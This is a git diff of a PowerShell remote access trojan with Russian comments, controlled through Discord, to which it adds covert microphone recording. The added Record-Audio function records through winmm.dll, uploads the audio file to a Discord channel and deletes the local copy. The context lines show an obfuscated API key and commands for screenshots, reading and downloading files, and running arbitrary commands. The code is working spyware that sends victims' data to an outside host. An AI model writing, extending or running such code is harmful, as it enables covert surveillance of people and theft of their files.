@@ -1,10 +1,10 @@
 ﻿function Get {
-    $encoded = @(123, 131, 160, 105, 149, 132, 136, 158, 95, 147, 105, 162, 106, 98, 127, 172, 126, 118, 125, 171, 172, 139, 145, 130, 136, 132, 168, 123, 115, 128, 117, 134, 132, 121, 120, 160, 127, 149, 96, 147, 104, 115, 101, 138, 121, 96, 131, 129, 102, 149, 172, 128, 101, 119, 134, 127, 103, 149, 172, 128, 102, 153, 134, 128, 99, 119, 156, 127, 169, 131, 134, 127)
-    $decoded = ""
-    for ($i = $encoded.Length - 1; $i -ge 0; $i--) {
-        $decoded += [char]($encoded[$i] - 50)
-    }
-    return $decoded
+    $encoded = @(123, 131, 160, 105, 149, 132, 136, 158, 95, 147, 105, 162, 106, 98, 127, 172, 126, 118, 125, 171, 172, 139, 145, 130, 136, 132, 168, 123, 115, 128, 117, 134, 132, 121, 120, 160, 127, 149, 96, 147, 104, 115, 101, 138, 121, 96, 131, 129, 102, 149, 172, 128, 101, 119, 134, 127, 103, 149, 172, 128, 102, 153, 134, 128, 99, 119, 156, 127, 169, 131, 134, 127)
+    $decoded = ""
+    for ($i = $encoded.Length - 1; $i -ge 0; $i--) {
+        $decoded += [char]($encoded[$i] - 50)
+    }
+    return $decoded
 }
 
 $API_KEY = Get
@@ -140,6 +140,81 @@ public class DPI {
     Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
 }
 
+# --- ФУНКЦИЯ ЗАПИСИ ЗВУКА ---
+
+function Record-Audio {
+    param([int]$duration = 10)
+    
+    # Ограничение максимальной длительности (5 минут)
+    if ($duration -gt 300) {
+        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Максимальная длительность записи - 300 секунд"
+        return
+    }
+    
+    if ($duration -lt 1) {
+        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Минимальная длительность записи - 1 секунда"
+        return
+    }
+    
+    $tempFolder = $env:TEMP
+    $outputFile = "$tempFolder\audio_$(Get-Date -Format 'HHmmss').wav"
+    
+    Send-DiscordMessage -content "**[$CLIENT_ID]** Начинаю запись звука на $duration секунд..."
+    
+    try {
+        # Добавляем тип для записи звука
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class AudioRecorder {
+    [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
+    public static extern int mciSendString(string command, string returnValue, int returnLength, IntPtr hwndCallback);
+}
+"@
+        
+        # Открыть устройство
+        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recsound", "", 0, [IntPtr]::Zero)
+        
+        # Начать запись
+        [AudioRecorder]::mciSendString("record recsound", "", 0, [IntPtr]::Zero)
+        
+        # Ждем указанное время
+        Start-Sleep -Seconds $duration
+        
+        # Остановить запись
+        [AudioRecorder]::mciSendString("stop recsound", "", 0, [IntPtr]::Zero)
+        
+        # Сохранить файл
+        [AudioRecorder]::mciSendString("save recsound `"$outputFile`"", "", 0, [IntPtr]::Zero)
+        
+        # Закрыть устройство
+        [AudioRecorder]::mciSendString("close recsound", "", 0, [IntPtr]::Zero)
+        
+        # Проверяем, создался ли файл
+        if (Test-Path $outputFile) {
+            $fileSize = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
+            Send-DiscordMessage -content "**[$CLIENT_ID]** Запись завершена ($fileSize KB). Отправляю файл..."
+            
+            # Отправляем файл
+            Send-DiscordFile -filePath $outputFile -message "**[$CLIENT_ID]** Аудиозапись ($duration сек)"
+            
+            # Удаляем файл после отправки
+            Start-Sleep -Seconds 2
+            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
+        } else {
+            Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Файл записи не создан"
+        }
+        
+    } catch {
+        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка записи звука: $($_.Exception.Message)"
+        
+        # Удаляем файл в случае ошибки
+        if (Test-Path $outputFile) {
+            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
 # --- УПРАВЛЕНИЕ КОМАНДАМИ ---
 
 function Invoke-Command {
@@ -261,6 +336,7 @@ function Show-Help {
 
 ``!$CLIENT_ID`` - Показать статус системы
 ``!$CLIENT_ID screen`` - Сделать скриншот
+``!$CLIENT_ID sound [секунды]`` - Записать звук (по умолчанию 10 сек, макс 300)
 ``!$CLIENT_ID cd [путь]`` - Сменить директорию и показать содержимое
 ``!$CLIENT_ID cat [файл]`` - Показать содержимое файла (20 строк)
 ``!$CLIENT_ID get [файл]`` - Скачать файл
@@ -269,6 +345,7 @@ function Show-Help {
 ``!$CLIENT_ID all`` - Статус всех
 
 **Примеры:**
+``!$CLIENT_ID sound 60`` - Записать звук на 60 секунд
 ``!$CLIENT_ID cd C:\Users\`` - Перейти в папку по полному пути
 ``!$CLIENT_ID cd Documents`` - Перейти в подпапку Documents
 ``!$CLIENT_ID cd ..`` - Перейти на уровень выше
@@ -327,13 +404,17 @@ function Check-Commands {
 
                     Send-DiscordMessage -content $status
                 }
-                elseif ($content -match "^!all$") {
-                    $uptime = (Get-Date) - $script:startTime
-                    $uptimeStr = "{0}ч {1}м" -f [math]::Floor($uptime.TotalHours), $uptime.Minutes
-                    Send-DiscordMessage -content "**[$CLIENT_ID] Активна** - Uptime: $uptimeStr`nТекущий путь: ``$($script:currentPath)``"
-                }
+                elseif ($content -match "^!all$") {
+                    $uptime = (Get-Date) - $script:startTime
+                    $uptimeStr = "{0}ч {1}м" -f [math]::Floor($uptime.TotalHours), $uptime.Minutes
+                    Send-DiscordMessage -content "**[$CLIENT_ID] Активна** - Uptime: $uptimeStr`nТекущий путь: ``$($script:currentPath)``"
+                }
                 elseif ($command -eq "help") {
                     Show-Help
+                }
+                elseif ($command -eq "sound") {
+                    $duration = if ($argument -and $argument -match '^\d+$') { [int]$argument } else { 10 }
+                    Record-Audio -duration $duration
                 }
                 elseif ($command -eq "run") {
                     Invoke-Command -command $argument
